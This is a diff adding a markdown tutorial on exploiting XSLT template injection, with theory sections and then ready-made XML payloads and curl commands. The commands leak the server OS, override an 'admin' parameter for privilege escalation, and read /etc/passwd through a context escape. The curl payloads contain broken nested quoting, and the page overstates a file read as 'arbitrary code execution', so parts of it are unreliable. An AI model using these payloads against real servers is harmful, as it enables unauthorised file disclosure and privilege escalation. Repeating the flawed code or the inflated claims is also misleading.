@@ -1,0 +1,88 @@
+---
+title: Exploiting XSLT Template Injection in Web Apps
+description: Learn to exploit XSLT Template Injection for executing arbitrary code
+  and accessing sensitive data in web applications.
+keywords:
+- XSLT Template Injection
+- dynamic template generation
+- code execution
+- data access
+- template manipulation
+- context escape
+- XSLT parameter injection
+---
+
+# Exploiting XSLT Template Injection
+
+## Context
+
+Template Injection involves exploiting vulnerabilities in applications that use XSLT (Extensible Stylesheet Language Transformations) for dynamic template generation. This technique allows attackers to execute code or manipulate logic by injecting malicious templates or altering existing logic. The objective is to manipulate template construction in XSLT, leading to potential code execution, data access, or logic modification. This content assumes familiarity with XSLT processing internals, template engine operation, XML structure and parsing, and general XSLT injection techniques.
+
+## Theory
+
+### Dynamic Template Generation in XSLT
+
+Dynamic template generation in XSLT occurs when templates are constructed or modified during runtime based on user input. This approach can make applications vulnerable if templates are not properly sanitized. When user-controlled data influences template definitions, it can alter XSLT logic or inject malicious code.
+
+### Template Parameter and Variable Injection
+
+Template parameter injection involves influencing the values of `<xsl:param>` or `<xsl:variable>` elements in XSLT templates. If these parameters are improperly sanitized, attackers can inject values that modify the intended logic of the transformation. This vulnerability model allows the attacker to define or override template variables, which can significantly influence the output of the transformation.
+
+### Template Manipulation and Poisoning
+
+Template manipulation refers to altering or injecting new `<xsl:template>` blocks into the XSLT processing sequence. By doing so, attackers can hijack the transformation process, enabling the execution of arbitrary code or the exfiltration of sensitive data. The typical attack sequence involves injecting a malicious template that is eventually invoked during the transformation.
+
+### Context Escape in XSLT
+
+Context escape in XSLT occurs when an attacker bypasses the intended restrictions of the template logic. By crafting inputs that challenge weak validation mechanisms, attackers can inject unauthorized templates or parameters. This technique enables them to execute arbitrary XSLT instructions outside the initially intended context.
+
+## Practice
+
+### Injecting a Malicious XSLT Template via User Input
+
+- Identify user input reflected in XSLT template construction. Focus on parameters or variables within the XSLT code that are affected by user inputs.
+- Inject the following payload to define a new template:
+  ```xml
+  <xsl:template match="/">
+      <xsl:value-of select="system-property('os.name')"/>
+  </xsl:template>
+  ```
+  This payload is designed to leak the server's operating system information.
+- Use the following command to inject the payload via CURL:
+  ```bash
+  curl -X POST -d "template=<xsl:template match='/'> <xsl:value-of select='system-property('os.name')'/> </xsl:template>" https://target-app/upload-xslt
+  ```
+- Trigger the XSLT transformation process to ensure the template is processed. This action tests whether the injected template is executed.
+
+### Overriding XSLT Parameters to Influence Logic
+
+- Locate the `<xsl:param>` or `<xsl:variable>` elements that receive data from user input. Determine how these inputs are influencing XSLT parameters.
+- Inject a payload to override an XSLT parameter:
+  ```xml
+  <xsl:param name="admin">true</xsl:param>
+  ```
+  This payload attempts to escalate privileges by overriding the 'admin' parameter.
+- Use the CURL command to inject this parameter override:
+  ```bash
+  curl -X POST -d "param=<xsl:param name='admin'>true</xsl:param>" https://target-app/upload-xslt
+  ```
+- After injection, check if access is granted to application features normally restricted by the 'admin' parameter.
+
+### Context Escape to Inject Arbitrary XSLT Instructions
+
+- Examine input fields for opportunities to escape the current context (e.g., through unescaped template fragments).
+- Attempt context escape by injecting a payload to close existing templates and inject new instructions:
+  ```xml
+  </xsl:template><xsl:template match="/"> <xsl:value-of select="document('file:///etc/passwd')"/> </xsl:template>
+  ```
+  This payload attempts to read sensitive files from the server.
+- Use CURL to submit the payload:
+  ```bash
+  curl -X POST -d "template=</xsl:template><xsl:template match='/'> <xsl:value-of select='document('file:///etc/passwd')'/> </xsl:template>" https://target-app/upload-xslt
+  ```
+- Review the output to see if the content of the sensitive file has been exposed, verifying the success of the context escape and arbitrary code execution.
+
+## Tools
+
+- **curl**
+- **Burp Suite**
